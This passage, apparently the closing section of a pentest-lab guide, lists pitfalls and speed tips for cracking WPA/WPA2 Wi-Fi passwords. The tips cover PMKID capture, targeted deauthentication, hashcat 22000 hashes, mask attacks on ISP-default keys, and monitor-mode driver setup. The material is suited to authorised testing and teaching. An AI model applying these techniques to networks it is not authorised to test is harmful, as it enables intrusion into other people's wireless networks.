tearing down · documented at the end and ran out of time · following a `-m 2500`/hccapx blog ·
en-dash in copy-pasted `--test`/`--bssid` · source-built driver didn't survive a kernel upgrade
(use DKMS) · hard-killed the VM and corrupted the ARM64 disk.

**Pro tips for speed:** bisect by stage before changing any flag · lock the channel the instant
you know the target · PMKID first (client-less, often instant via `hcxpsktool`) · one deauth,
not a flood · convert and `--show` early (the key may already be in the potfile) · ISP-default
PSKs are structured → masks before giant wordlists · one `.hc22000`, many nets, one GPU run ·
split radio from GPU (Kali captures, Mac cracks) · resumable sessions + `-S` on every long run ·
keep a lab potfile separate per engagement · `iw` over deprecated `iwconfig` · two cards beat
one (one locked capturing, one for injection + the card-to-card test) · label dongles with
chipset + known-good kernel · pin a working kernel on the lab box before an engagement (new
kernels repeatedly break out-of-tree monitor-mode support).
